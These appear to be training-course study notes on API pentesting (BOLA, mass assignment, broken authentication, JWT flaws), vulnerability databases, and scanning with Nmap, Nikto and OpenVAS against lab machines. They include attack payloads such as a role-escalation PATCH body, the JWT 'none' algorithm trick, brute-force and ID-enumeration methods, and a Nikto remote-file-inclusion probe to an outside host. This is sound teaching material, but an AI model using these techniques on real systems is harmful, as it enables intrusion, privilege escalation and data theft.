API testing overlaps with traditional web testing but introduces distinct challenges. There's no visible UI restricting what a user can do — no buttons or forms limiting requests. An attacker interacts directly with raw endpoints, crafting and sending anything without being constrained by what a front-end chooses to expose. This directness opens vulnerability classes less common in traditional web testing, such as **Broken Object Level Authorization** and **mass assignment**.

A typical API engagement: receive a collection of in-scope endpoints (often an Insomnia/Postman collection) and test each for how it handles authentication, whether authorisation is enforced on every resource, and whether responses expose more data than necessary.

**Learning Objectives:**

- Understand the fundamentals of RESTful APIs — request/response structure and typical authentication handling
- Read and interpret API requests and responses in JSON format
- Identify and exploit common API vulnerabilities from the OWASP API Security Top 10 (BOLA, Broken Authentication, Mass Assignment)
- Understand how modifying request parameters, headers, and body fields can expose security flaws
- Recognise defensive strategies against the vulnerabilities explored

**Prerequisites:** Comfort with basic HTTP (request methods, headers, status codes) — HTTP in Detail, OWASP Top 10.

#### How REST APIs Work

**REST** (Representational State Transfer) is the most common API style in modern web apps. It is not a protocol or strict standard — it's an **architectural style**, a set of conventions developers follow when building APIs over HTTP. An API following these conventions is a **RESTful API**.

**Resources and Endpoints** — The core concept is the **resource**: any object/data the API exposes (a user, product, order). Each resource is identified by a URL, called an **endpoint** — e.g. `/v1/users`, `/v1/products`, `/v1/orders`.

The URL structure is hierarchical: `/v1` indicates API version, the final segment identifies the resource collection, and an appended identifier refers to a single resource (`/v1/users/42` = user ID 42). This predictable structure is a defining RESTful trait — and from a security angle, it makes resource references easy to guess, which is directly relevant to authorisation vulnerabilities like BOLA.

**HTTP Methods** map to CRUD operations:

|Method|CRUD Operation|Description|Example|
|---|---|---|---|
|GET|Read|Retrieves a resource; should never modify server data|`GET /v1/products/1` returns product 1's data|
|POST|Create|Creates a new resource or submits data for processing|`POST /v1/auth/login` with JSON body authenticates and returns a token|
|PUT|Full Update|Replaces an existing resource entirely — omitted fields may become null/default|`PUT /v1/users/4` replaces all of user 4's data|
|PATCH|Partial Update|Modifies only the included fields; everything else unchanged|`PATCH /v1/users/me` updates only specified fields|
|DELETE|Delete|Removes a resource from the server|`DELETE /v1/users/4` deletes user 4|

**PUT vs. PATCH:** PUT expects the full object; PATCH expects only the fields to change. APIs sometimes validate the two differently — relevant during testing.

**Status Codes** relevant to API security testing:

|Code|Meaning|Security Relevance|
|---|---|---|
|200|OK|Request succeeded|
|201|Created|New resource created (typically after POST)|
|204|No Content|Success with no response body (typical for DELETE)|
|400|Bad Request|Malformed request — useful for understanding input validation|
|401|Unauthorized|Authentication missing or invalid|
|403|Forbidden|Authenticated but not authorised — key indicator during BOLA testing|
|404|Not Found|Resource does not exist|
|405|Method Not Allowed|HTTP method not supported for this endpoint|
|429|Too Many Requests|Rate limiting in effect|
|500|Internal Server Error|Server-side failure — may indicate injection or logic flaws|

**401 vs. 403** is an important distinction: **401** = the server doesn't know who you are; **403** = the server knows who you are but you're not permitted to access the resource.

**Request and Response Structure** — A typical request has the HTTP method, endpoint URL, headers (metadata like auth tokens and content type), and optionally a body (data payload). Most modern APIs use **JSON**. A login response typically returns an `access_token`, used in subsequent requests via the `Authorization: Bearer <token>` header.

**Authentication Mechanisms:**

- **API Keys** — Simplest form; client includes a static key in a header (commonly `X-API-Key`), the server looks it up to identify the client. Drawback: long-lived, often shared across environments — if leaked, grants full access until rotated.
- **Bearer Tokens** — Client authenticates via credentials to a login endpoint, receives a token, and includes it in the `Authorization` header on subsequent requests. Typically short-lived and revocable.
- **JSON Web Tokens (JWTs)** — Most common bearer token format. Three Base64-encoded, dot-separated parts: **header** (algorithm), **payload** (claims — user ID, role, expiration), **signature** (tamper protection). The payload is only **encoded, not encrypted** — anyone with the token can read its contents. Key claims to note: `user_id`, `role`, `exp`.

#### Broken Object Level Authorization (BOLA)

**BOLA** is an authorisation failure where an API returns a requested object without verifying the requesting user is permitted to access it — the API authenticates the user but doesn't authorise the request against that specific resource. Also known as **IDOR** (Insecure Direct Object Reference) in traditional web testing.

**Why BOLA is the #1 API risk** — It tops the OWASP API Security Top 10 because it appears in a huge number of real-world APIs and frequently leads to mass data exposure. Most API frameworks don't enforce object-level authorisation by default — they handle authentication and routing, but the "does this user own this object?" check must be **manually implemented in every endpoint**. Missing it on even one endpoint creates a BOLA vulnerability.

RESTful APIs reference objects through predictable, structured URLs (`GET /v1/orders/1045`), usually with sequential integer IDs directly in the URL. If ownership isn't verified before returning the object, any authenticated user can access another user's data just by changing the number.

**How BOLA works:** Authenticated as user 4, requesting `GET /v1/users/4/orders` correctly returns your own orders. Changing the URL to `GET /v1/users/1/orders` while still authenticated as user 4 requests _user 1's_ data. A properly secured API compares the token's user ID against the URL's user ID and returns `403 Forbidden`. A vulnerable API fetches whatever ID is in the URL without this comparison — it trusts the URL parameter and goes straight to the database.

BOLA isn't limited to URL path parameters — it can appear in **query strings** (`?owner_id=13`), **request body fields** (`{"user_id": 13}`), and **custom headers** (`X-User-ID: 13`). Any location accepting an object identifier without validation against the authenticated user is a potential vector.

**Scaling the attack** — Once a vulnerable endpoint is confirmed, looping through sequential IDs (e.g. 1–1000) extracts every user's data in seconds — mass data exfiltration with minimal effort. Some APIs use **UUIDs** instead of sequential integers, which adds obscurity but is **not a security control** — UUIDs can leak through other endpoints, responses, or error messages.

**Practical exercise (BOLA Simulator, authenticated as testuser / user ID 4):**

1. Query own profile (`GET /v1/users/4`), then change the ID to `1` — if user 1's data returns instead of `403 Forbidden`, BOLA is confirmed. Check for sensitive fields that shouldn't be visible.
2. Query user 1's order history (`GET /v1/users/{id}/orders`) — look for a flag in the order data.
3. Test whether BOLA extends to **write operations** via a `PATCH` against another user's profile — if accepted, the vulnerability escalates from information disclosure to a **data manipulation flaw**.

#### Broken Authentication and Excessive Data Exposure

**Broken Authentication — Lack of Rate Limiting on Login Endpoints**

A broad category of flaws in how an API verifies identity. A common manifestation: a login endpoint with no rate limiting, letting an attacker submit thousands of credential combinations per minute. Traditional web apps use CAPTCHAs or account lockouts; APIs, built for programmatic access, often skip these — resulting in unlimited authentication attempts.

Without rate limiting, **brute-force** and **credential-stuffing** attacks become trivial. Credential stuffing uses username/password pairs leaked from other breaches — since many users reuse passwords, success rates can be high.

**JWT Implementation Flaws:**

- **Weak signing secrets** — JWTs signed with HS256 rely on a secret key. If guessable (`secret`, `password`, company name), an attacker can crack it offline with tools like `hashcat` or `jwt_tool` and forge arbitrary tokens.
- **The `none` algorithm attack** — exploits APIs accepting unsigned JWTs. An attacker sets `"alg": "none"` in the header, crafts any claims desired, strips the signature, and the server accepts it.
- **Missing expiration validation** — a stolen token stays valid indefinitely if the server doesn't check the `exp` claim.

**Excessive Data Exposure**

In API-driven architectures, the back-end returns raw JSON and the **front-end decides what to display**. The problem: developers return entire database objects and rely on the front-end to filter sensitive fields. The front-end might render `username`, `email`, and an avatar, but the raw response may also contain `password_hash`, `api_key`, `internal_notes`, and `last_login_ip`. Anyone inspecting the response in Burp Suite or browser DevTools sees everything — **front-end filtering provides no real security**, since the data already left the server.

This is especially dangerous combined with **BOLA**: if an attacker can access other users' profiles _and_ the API over-returns data, the two vulnerabilities together escalate from a moderate access-control issue to a **full data breach**.

**Practical exercise (Broken Authentication & Excessive Data Exposure Simulator):**

- **Broken Authentication panel** — simulates an admin login endpoint. Repeated wrong-password attempts return `401 Unauthorized` and the attempt counter climbs, but the API never returns `429 Too Many Requests` and never locks the account — demonstrating the missing rate limit. In a real engagement, tools like `ffuf` would automate this against a common password wordlist (e.g. SecLists' 10k most common passwords). Entering the correct password returns `200 OK` with the admin JWT.
- **Excessive Data Exposure panel** — toggling between Front-End View and Raw API Response for a user profile shows the front-end renders only `username`, `email`, `membership date`, while the raw response includes `password_hash`, `api_key`, `internal_notes`, and `last_login_ip` — all returned by the server every time, just hidden by the front-end.

#### Mass Assignment and Rate Limiting

**Understanding Mass Assignment**

Occurs when an API takes client-submitted data and applies it directly to an internal object without filtering which fields the client is permitted to set. A profile update UI sends fields like `email` or `username`, but the server-side user object likely has additional fields — `role`, `is_admin`, `account_balance`, `email_verified` — normally set only by server-side logic.

If the API doesn't distinguish client-writable from server-controlled fields, an attacker can inject extra parameters: `PATCH /v1/users/me` with `{"email": "new@shop.thm", "role": "admin"}` updates both fields if the API blindly accepts the whole body. The attacker escalates privileges **without exploiting any authentication flaw** — the API simply accepted every field it was given.

**Finding injectable fields:**

- **API responses themselves** — if a user profile response includes `role`, `is_admin`, or `credit_balance`, those field names reveal what attributes exist. This is where excessive data exposure directly feeds into mass assignment — the API reveals the field names to inject.
- **Exposed API documentation** — OpenAPI specs sometimes mark fields `readOnly`, hinting the field exists but is meant to be server-controlled. The real question is whether the API actually enforces that.

Mass assignment isn't limited to profile updates — it can appear in any endpoint accepting a request body: registration, order modification, settings changes.

**Rate Limiting Beyond Authentication**

Missing rate limits affect any endpoint, not just login. Without limits, an attacker can:

- Brute-force OTP codes (a 4-digit code has only 10,000 combinations)
- Scrape user data at scale
- Abuse endpoints that trigger costly actions (SMS/email sends)
- Overwhelm the API to cause denial of service

**Testing:** send a burst of identical requests and check whether `429 Too Many Requests` is ever returned. Well-implemented rate limiting includes headers like `X-RateLimit-Limit`, `X-RateLimit-Remaining`, and `X-RateLimit-Reset`. Their absence suggests rate limiting likely isn't in place.

**Practical exercise (Mass Assignment Simulator):**

1. `GET /v1/users/me` shows the current profile, including a `role: customer` field the front-end gives no way to change — but it's visible in the raw response.
2. Edit the default `PATCH /v1/users/me` body (`{"email": "testuser@shop.thm"}`) to add `"role": "admin"` and send it.
3. If accepted, the auth banner changes from `CUSTOMER` to `ADMIN`, confirming the mass assignment vulnerability, and unlocks `GET /v1/admin/users` — a previously restricted endpoint. Query it to see all registered users and find the flag.

> [!summary] Quick Recap — API Pentesting
> 
> - REST is a convention, not a protocol: predictable resource URLs (`/v1/{resource}/{id}`), CRUD via HTTP methods (GET/POST/PUT/PATCH/DELETE)
> - **401** = server doesn't know who you are; **403** = server knows but denies access — the key signal in BOLA testing
> - **BOLA/IDOR** (#1 API risk): object-level ownership checks are almost never automatic — test by swapping IDs in URL paths, query strings, body fields, and custom headers; try both read _and_ write (PATCH) operations
> - Sequential IDs = trivially scriptable mass data extraction; UUIDs only add obscurity, not real security
> - **Broken Authentication**: missing rate limiting on login enables brute-force/credential stuffing; JWT risks = weak HS256 secrets (crackable via `jwt_tool`/`hashcat`), `"alg": "none"` acceptance, and missing `exp` validation
> - **Excessive Data Exposure**: back-end often returns the full object; front-end hiding fields ≠ security — always check the raw JSON response
> - **Mass Assignment**: inject unexpected fields (`role`, `is_admin`, etc.) into PATCH/POST bodies — discover field names from API responses or OpenAPI docs marked `readOnly`
> - **Rate limiting** applies to every endpoint, not just login — test with request bursts, check for `429` and `X-RateLimit-*` headers
> - BOLA + Excessive Data Exposure compound into a full data breach; Excessive Data Exposure + Mass Assignment reveals exactly which fields to inject

## 10. Vulnerability Knowledge

> [!info] Section overview Eight rooms: Understanding Vulnerability Databases, Vulnerability Scanning Tools, Basic Vulnerability Identification Techniques, NoScope: Finding RCE, n8n: CVE-2025-68613, AD: BadSuccessor, CVE-2026-46300: Fragnesia, CVE-2026-42945: Nginx Rift.

### Understanding Vulnerability Databases

#### Intro

**Vulnerability databases** are centralised repositories that collect, organise, and publish information about known security vulnerabilities. Instead of every security team rediscovering the same issues, they provide a shared source of truth for the cyber security community.

These databases document:

- What the vulnerability is
- Which products or versions are affected
- How severe the issue might be
- Where to find more technical details or fixes

Used by security analysts, sysadmins, penetration testers, and automated security tools to understand existing threats and make informed decisions.

**Without vulnerability databases:**

- Vulnerabilities would be named inconsistently
- Patch tracking would be difficult
- Security tools would lack reliable reference data

By standardising vulnerability information, these databases enable efficient vulnerability management, risk assessment, and remediation planning across organisations.

**Learning Objectives:**

- Understand what vulnerability databases are
- Learn why vulnerability databases are important
- Recognise common vulnerability database terminology
- Explore different vulnerability databases through hands-on tasks

**Prerequisites:** Networking Core Protocols, Networking Essentials, Web Application Basics.

#### Why We Use Vulnerability Databases

Before vulnerability databases existed, security teams often worked in isolation — the same vulnerability could be researched repeatedly by different people, described with different names, and patched with no clear visibility. This made it easy for critical issues to be missed or misunderstood.

Vulnerability databases address this by providing a **centralised, standardised** source of information. They help security professionals:

- Avoid duplicate research by referencing known issues
- Use consistent naming for vulnerabilities across tools and teams
- Stay aware of available patches and security advisories

They also connect the full security lifecycle: a **vulnerability** describes a weakness in software/configuration, an **exploit** demonstrates how it can be abused, and a **patch/mitigation** provides the fix. Databases tie all of this together — allowing teams to track affected systems, prioritise fixes, and reduce risk in a structured way.

#### Key Building Blocks

Vulnerability databases use standardised building blocks to describe issues consistently and actionably:

**Vulnerability Identifier (CVE)** — Uniquely identifies a known security flaw for consistent tracking across tools/databases. The most widely used system is **CVE** (Common Vulnerabilities and Exposures), which assigns a unique ID per vulnerability. E.g. `CVE-2021-44228` refers to **Log4Shell**, letting scanners, databases, and reports reference the same issue unambiguously.

**Severity Representation (CVSS)** — Severity is represented via the **Common Vulnerability Scoring System (CVSS)**, a numerical score reflecting exploitability and potential impact. E.g. a CVSS score of `9.8` is critical and generally needs immediate attention.

**Affected Product Identification (CPE)** — **Common Platform Enumeration (CPE)** gives a standardised naming format for vendors, products, and versions to precisely define what is vulnerable — rather than "Apache is affected," a CPE entry specifies the exact affected version.

**Common Weakness Enumeration (CWE)** — Classifies the _underlying weakness_ that caused the issue, grouping vulnerabilities by root cause rather than just symptom. E.g. `CWE-94` (Improper Control of Generation of Code) indicates a code-injection weakness, regardless of which product it appears in.

**CVE Numbering Authorities (CNA)** — Organisations authorised to assign CVE identifiers to newly discovered vulnerabilities. CNAs scale the CVE program by letting vendors/organisations report vulnerabilities in their own products directly. E.g. Microsoft, as a CNA, assigns CVE IDs for Windows/Microsoft service vulnerabilities, keeping them consistently tracked across the CVE List and other databases.

**Vulnerability Metadata** — Beyond identifiers and scores, entries include technical descriptions, reference links, and remediation info — e.g. links to vendor advisories or research explaining how to patch.

**Severity vs. Risk** — **Severity** = the technical impact of a vulnerability. **Risk** = how that vulnerability affects a _specific_ environment (exposure, usage, business importance). Example: a high-severity vulnerability on an isolated test system is lower **risk** than a medium-severity one on an internet-facing production server.

#### Type of Vulnerability DBs: CVE List

The **CVE List** is a public catalogue of known security vulnerabilities providing a unique identifier per issue, ensuring consistent reference across tools, reports, and databases. Maintained by **MITRE**, which coordinates with vendors and researchers to assign CVE identifiers. MITRE does **not** analyse severity or provide remediation guidance — its role is limited to tracking and standardising vulnerability names.

Each entry provides a standardised identifier, a brief description, and affected vendor/product info; it may also include severity scores and version details when provided by the assigning authority.

**Practical — looking up `CVE-2026-22869` on cve.org:**

1. **Published/Updated dates** — both `2026-01-13`, showing initial disclosure and last modification.
2. **Title/Description** — the vulnerability allows arbitrary code execution in `Eigent` via a GitHub Actions CI workflow using the `pull_request_target` trigger.
3. **CWE** — `CWE-94`, confirming improper control of code generation (code injection).
4. **CVSS** — `CVSS v4.0` score of `8.9` (High), exploitable remotely without authentication or user interaction.
5. **Affected products** — vendor `eigent-ai`, product `eigent`, all versions prior to commit `bf02500bbbab0f01cd0ed8e6dc21fe5683d6bfb5` affected.

The CVE List gives structured descriptions, severity scores, weakness classifications, and affected products — but may lack exploitation details, PoCs, or mitigation steps, requiring further research elsewhere.

#### Type of Vulnerability DBs: National Vulnerability Database (NVD)

The **NVD** is a public vulnerability database maintained by **NIST**. It builds on the CVE List by enriching entries with additional analysis, scoring, and structured data.

Where the CVE List focuses on uniquely _identifying_ vulnerabilities, the NVD provides **context and assessment** — more useful for risk analysis and vulnerability management. It enhances CVE records with CVSS severity scoring, CPE-based affected product mappings, and impact metrics, letting teams better understand severity and exactly which systems may be affected.

Unlike the CVE List, the NVD performs its **own** analysis and standardisation, ensuring consistency across severity scores and product data — many security tools rely on the NVD as a primary data source for vulnerability prioritisation.

**Practical — looking up `CVE-2025-67501` on nvd.nist.gov:**

1. **Description** — WeGIA (open-source web manager) has a SQL injection vulnerability in `/html/matPat/editar_categoria.php` due to improper validation of the `id_categoria` parameter. Fixed in version 3.5.5.
2. **Metrics** — NVD had not yet provided its own CVSS score; the CNA (GitHub, Inc.) assigned a `CVSS v4.0` score of `9.4` (Critical) — showing how NVD can display multiple severity sources.
3. **References** — one reference tagged `Exploit` links to a GitHub Security Advisory with technical details and PoC info for the SQL injection.
4. **Weakness Enumeration** — maps to `CWE-89`, confirming SQL injection as root cause.
5. **Known Affected Software Configurations** — CPE identifiers show WeGIA versions up to (not including) 3.5.5 are vulnerable.

CVE.org and the NVD detail page often show the same description/product info/links, since the NVD has already enriched that CVE with all available data. Both reference the same CVE identifiers, but the **NVD is generally more comprehensive** — adding detailed CVSS scoring/vector breakdowns, clearly tagged references (patches/exploits), and structured CPE/CWE mappings. This makes the NVD more useful for assessment, prioritisation, and risk-based decisions than the CVE List alone.

#### Type of Vulnerability DBs: Other Public VDBs

Beyond the CVE List and NVD, several other public vulnerability databases exist, each serving a specific purpose during pentesting or securing a system:

- **Exploit-focused databases** (e.g. **ExploitDB**) — concentrate on PoC exploits and real-world attack techniques; commonly used by pentesters and red teamers to understand practical exploitation.
- **Vendor security advisories** — published directly by software vendors; authoritative info on vulnerabilities in their own products, often including patch availability, mitigation steps, and upgrade paths — valuable for defenders and sysadmins.
- **Community-driven and regional databases** — collect info from open-source contributors, researchers, or region-specific CERTs; may surface issues earlier than official sources or add context not found elsewhere.

Each serves a different role — exploitation, remediation, or early disclosure/regional awareness — complementing the CVE List and NVD rather than replacing them.

**Practical — looking up `CVE-2025-10327` on ExploitDB:** Search by CVE ID (or exploit title, platform, author, or content if no CVE ID is available). ExploitDB lists a matching exploit entry. On the exploit detail page:

- **Exploit overview** — title "RPi-Jukebox-RFID 2.8.0 - Remote Command Execution," unique **EDB-ID** (`52468`), associated `CVE-2025-10327`.
- **Exploit Metadata** — author name, exploit type (`WEBAPPS`), platform (`MULTIPLE`), publication date — helps identify origin and intended target environment.
- **Exploit Authenticity** — a small down arrow next to `Exploit` indicates a downloadable PoC is available; the **`EDB Verified`** label indicates the exploit has been tested/verified by ExploitDB; the **`Vulnerable App`** field points to the affected application/version needed to test the exploit — useful for quickly setting up a PoC.
- **Proof-of-Concept Code** — the Python-based exploit code shows how an attacker injects a malicious payload into the `playlist` parameter to execute arbitrary system commands.

Unlike the CVE List and NVD (identification/assessment focused), **ExploitDB provides hands-on exploitation details and PoC code** — particularly valuable for understanding how vulnerabilities are abused in real-world attacks.

> [!summary] Quick Recap — Understanding Vulnerability Databases
> 
> - Vulnerability databases give a **shared, standardised source of truth** — avoiding duplicate research and inconsistent naming
> - Chain: **vulnerability** (the weakness) → **exploit** (how it's abused) → **patch/mitigation** (the fix) — databases link all three
> - **CVE** = unique ID for a vulnerability; **CVSS** = numerical severity score; **CPE** = standardised affected-product naming; **CWE** = root-cause classification (not just symptom); **CNA** = org authorised to assign CVE IDs
> - **Severity ≠ Risk** — severity is technical impact; risk factors in exposure, usage, and business context for a _specific_ environment
> - **CVE List (MITRE)** — identification/naming only, no severity analysis or remediation guidance
> - **NVD (NIST)** — enriches CVE entries with its own CVSS scoring, CPE/CWE mappings, and tagged references (patch/exploit) — more comprehensive, better for risk-based prioritisation
> - **Other VDBs**: ExploitDB (PoC/exploitation focus), vendor advisories (patches/mitigation), community/regional databases (early disclosure, extra context)
> - Workflow for research: start at CVE List/NVD for identification + severity + CWE root cause, then pivot to ExploitDB or vendor advisories for practical exploitation or remediation detail
### Vulnerability Scanning Tools

#### Intro

**Vulnerability scanning** is an automated process that identifies weaknesses, misconfigurations, and potential security issues across systems, networks, web applications, and devices. It's usually one of the first steps in a penetration test or security assessment.

**Learning Objectives:**

- Understand what vulnerability scanning is and why it is crucial for securing systems and networks
- Learn key concepts, including vulnerabilities, CVEs, CVSS, and common types of scanners
- Gain practical skills using Nmap, OpenVAS, and Nikto to identify and analyse vulnerabilities
- Develop the ability to interpret scan results and understand their security impact
- Learn best practices for performing safe, effective, and ethical vulnerability scans

**Prerequisites:** Networking Core Protocols, Networking Essentials, Web Application Basics.

#### Important Topics

**Core Terminology:**

- **Vulnerability** — a weakness or flaw in a system that could be exploited to bypass security or gain unauthorised access; may result from outdated software, poor configuration, or design mistakes. _Like a door with a broken lock that anyone can open, even though it's supposed to stay secure._
- **Common Vulnerabilities and Exposures (CVE)** — a unique ID assigned to a publicly known security flaw, enabling consistent tracking across tools and databases. _Similar to a product recall number for a faulty car part, but applied to software._
- **Common Vulnerability Scoring System (CVSS)** — a standardised score (0–10) measuring severity/risk based on impact and exploitability; higher scores need more urgent attention. _Like weather alerts classifying storms as mild, moderate, or severe._
- **Misconfiguration** — a system/service set up incorrectly, creating unnecessary security weaknesses; often arises from default settings, open permissions, or lack of hardening. _Like leaving Wi-Fi protected with a password like "123456"._
- **Software Vulnerability** — a flaw in an application's code or logic allowing unintended behaviour or exploitation, usually requiring a patch/update. _Like a calculator app that crashes or misbehaves with certain inputs._

**Types of Vulnerability Scanners:**

- **Network Scanner** — examines devices on a network to identify open ports, running services, and possible exposure points; maps out what's accessible and where risks may exist. _Like walking down a street checking which doors or windows are unlocked._
- **Web Application Scanner** — analyses websites/web apps for issues like outdated components, weak configurations, or risky behaviours, focused specifically on the HTTP/HTTPS layer. _Like testing a login form to see if it accepts weak or unexpected inputs._
- **Host-Based Scanner** — runs directly on a system to check for missing patches, outdated software, and insecure configuration; gives a detailed view of internal system health. _Like an antivirus that reviews installed programs for known issues, not just malware._

**Output of a Scanning Report typically includes:**

- Severity level, indicating how serious the issue is
- Detected services and version information
- Related CVEs or known risks
- Recommended fixes or mitigation steps

#### Nmap

**Nmap** (Network Mapper) is a widely used network scanning tool that discovers hosts, identifies open ports, and determines which services are running on systems. It plays a key role early in vulnerability assessment — helping analysts understand what's exposed before any vulnerability can be tested or exploited, by mapping the attack surface and gathering essential info about the target environment.

**Host Discovery** — determines which devices on a network are active and responding, building a list of live systems to focus on before deeper scanning:

```bash
nmap -sn MACHINE_IP
```

```
Host is up (0.00014s latency).
Nmap done: 1 IP address (1 host up) scanned in 0.00 seconds
```

This confirms the machine is online and reachable — no ports or services are checked at this stage, since it's a host-only discovery scan.

**Port Scanning with Service/Version Detection** — identifies open ports and communication pathways, which often reveal running services that may contain vulnerabilities or misconfigurations:

```bash
nmap -sV MACHINE_IP
```

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.5
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    WebSockify Python/3.12.3
5901/tcp open  vnc     VNC (protocol 3.8)
8080/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

Four active services discovered: FTP (21), SSH (22), HTTP via WebSockify (80), and VNC (5901), plus a second HTTP service on 8080. Detected service **versions** matter, since outdated or misconfigured versions may carry known vulnerabilities.

**Aggressive Scan** (`-A`) — performs deeper enumeration: OS detection, service versions, script scanning, and traceroute. Gives far more detail than basic scans, but generates louder, more noticeable traffic — simulates a more thorough early-stage penetration test assessment:

```bash
nmap -A MACHINE_IP
```

Key findings from the aggressive scan:

- **FTP (21)** — `ftp-anon` script reports `Anonymous FTP login allowed (FTP code 230)`.
- **SSH (22)** — host key fingerprints for ECDSA and ED25519 disclosed.
- **HTTP (80)** — WebSockify banner and error-page fingerprinting.
- **VNC (5901)** — protocol 3.3, reported as **Locked out**.
- **HTTP (8080)** — Apache 2.4.58 (Ubuntu), page titled "AtlasNews — Company News"; flagged for a potential open proxy redirect and a `PHPSESSID` cookie missing the `httponly` flag.

This builds a much clearer picture of the machine's attack surface beyond a basic port scan.

**Vulnerability Scanning via NSE** — the **Nmap Scripting Engine (NSE)** is a framework of scripts (written in **Lua**) that automates vulnerability checks: brute-force attempts, version checks, protocol analysis, and basic vulnerability detection. NSE turns Nmap from a port scanner into a flexible tool for in-depth exploration and early security assessment.

```bash
nmap --script=ftp-anon -p21 MACHINE_IP
```

```
PORT   STATE SERVICE
21/tcp open  ftp
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
```

The `ftp-anon` NSE script confirms the FTP service grants unauthenticated users access (`FTP code 230`) — a real security risk, since anyone can log in without credentials and potentially view/download exposed files. **Anonymous FTP access should be disabled unless explicitly required.**

#### Nikto Web Scanner

**Nikto** is a widely used web server vulnerability scanner that identifies insecure configurations, outdated components, and common web-based weaknesses. It checks a target web server against thousands of known issues — default files, dangerous HTTP methods, misconfigurations, and potential exposures. Nikto is **not stealthy**, but is extremely effective for early web vulnerability assessments where thoroughness matters more than evasion — useful before moving into deeper application-layer testing.

```bash
nikto -h http://MACHINE_IP:8080
```

```
+ Server: Apache/2.4.58 (Ubuntu)
+ Cookie PHPSESSID created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ DEBUG HTTP verb may show server debugging information.
+ OSVDB-561: /server-status: This reveals Apache information.
+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found.
+ OSVDB-3268: /static/: Directory indexing found.
+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake's list.
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
```

**Understanding the results:**

|Finding|What It Means|
|---|---|
|**Server: Apache/2.4.58** (info disclosure)|Exact server version disclosed, letting attackers look up known vulnerabilities for it. Servers should limit version info exposure.|
|**PHPSESSID without `HttpOnly`**|Cookie accessible via client-side scripts, increasing session hijacking risk. Secure apps set both `HttpOnly` and `Secure` flags on session cookies.|
|**Missing `X-Frame-Options`**|Site can be embedded in an iframe, enabling clickjacking attacks that trick users into clicking hidden elements.|
|**`DEBUG` HTTP verb available**|An uncommon method that can reveal internal debugging information; unnecessary for normal operation and should be disabled.|
|**`/info.php` running `phpinfo()`**|Reveals extensive system info, modules, config values, and environment variables. Should be removed in production — high information-leakage risk.|
|**`/static/` directory indexing**|Anyone can browse directory contents without restriction, revealing files that shouldn't be public. Should be disabled unless strictly required.|
|**`info.php?file=<external_link>`** (RFI test)|Parameter may be vulnerable to **Remote File Inclusion** if mishandled — lets attackers load and execute code from an external server. One of the most severe web risks.|

**Overall assessment:** 7 notable issues out of 6,544 checks — none guarantee exploitation alone, but they significantly increase the attack surface. Most (status pages, missing headers, directory indexing) are configuration-related and fixable quickly through proper hardening.

#### OpenVAS & Greenbone

**OpenVAS** is a powerful vulnerability scanner assessing both host-level weaknesses and web application security issues. It supports deep authenticated and unauthenticated scanning — ideal for identifying misconfigurations, outdated software, missing patches, and exposed services.

Access the **Greenbone Security Assistant** dashboard via `http://127.0.0.1:9392` in Firefox, and log in with default credentials `admin:admin`.

**Adding a Target:** `Configuration > Targets` → `+` → enter target name and target IP → `Save`.

**Scanning a Target:** `Scans > Tasks` → `+` → `New Task` → enter task name, select the target added earlier, keep default scan configuration → `Save` → click **Run** to begin. OpenVAS analyses the host and shows real-time progress until completion.

> Live scans require internet access to sync feeds, and typically take 20–25 minutes — a pre-scanned task (`MyTarget`) is provided under Reports for offline review.

**Viewing the Report:** `Scans > Reports` → select the report entry → opens a dashboard with detected hosts, open ports, identified applications, OS details, and associated CVEs.

- **Results tab** — findings listed by severity, affected ports, and host details. Highlights issues such as anonymous FTP access, exposed `phpinfo` pages, missing cookie protections, and weak encryption settings, with detection timestamps and a quick risk overview per entry.
- **CVEs tab** — maps detected issues to known published vulnerabilities (e.g. anonymous FTP access, `phpinfo` exposure, ICMP timestamp disclosure).

#### Best Practice

- **Start Light** — begin with non-intrusive scans to avoid slowing or disrupting the target, especially in shared/production environments.
- **Right Tooling** — match the scanner to the job: Nmap for network discovery, OpenVAS for deep analysis, Nikto for web server checks.
- **Verify Results** — manually double-check high-severity findings, since scanners can produce false positives or incomplete information.
- **Stay Updated** — keep scanning tools and vulnerability feeds current so new CVEs and configuration issues can be identified.
- **Use Credentials** — where allowed, run authenticated scans for more accurate visibility into missing patches and internal weaknesses.
- **Compare Over Time** — save and regularly compare scan outputs to track improvements, catch regressions, and monitor newly introduced issues.
- **Scan Smart** — schedule scans during low-traffic hours, since vulnerability scanning can consume noticeable network and system resources.

> [!summary] Quick Recap — Vulnerability Scanning Tools
> 
> - Terminology: **vulnerability** (the flaw) → **CVE** (its ID) → **CVSS** (its severity score, 0–10) → **misconfiguration**/**software vulnerability** (common root causes)
> - Scanner types: **network** (ports/services), **web application** (HTTP/HTTPS layer), **host-based** (patches/local config)
> - **Nmap**: `-sn` = host discovery only → `-sV` = service/version detection → `-A` = aggressive (OS detection + scripts + traceroute, noisy) → `--script=<name>` = targeted NSE checks (e.g. `ftp-anon` for anonymous FTP)
> - **Nikto**: web-server-focused, checks thousands of known issues in one pass — info disclosure, missing security headers/cookie flags, dangerous HTTP verbs, exposed `phpinfo()`, directory indexing, and RFI-prone parameters — noisy but thorough
> - **OpenVAS/Greenbone**: full host + web vuln scanner via GUI (`Targets` → `Tasks` → `Run` → `Reports`), maps findings directly to CVEs; supports authenticated scans for deeper visibility
> - Best practice: light-touch first, right tool for the job, always manually verify high-severity hits, keep feeds updated, prefer authenticated scans, track results over time, and schedule for low-traffic windows
### Basic Vulnerability Identification Techniques

#### Intro

**Vulnerability identification** is the process of examining a target environment to identify exploitable weaknesses — in network services, operating systems, or applications. Before exploiting anything, you need to know what's there and what's wrong with it.

This phase sits **between** reconnaissance and exploitation. **Reconnaissance** collects information about the target (IP ranges, domain names, exposed infrastructure). **Exploitation** leverages a _confirmed_ weakness to achieve a specific outcome. Vulnerability identification is the middle step that turns "here's what exists" into "here's what's likely wrong with it."

An attacker who jumps straight from a port scan to running an exploit is guessing — without knowing what software is running, how it's configured, and what version it's at, there's no rational basis for choosing an attack path. A methodical approach removes that guesswork.

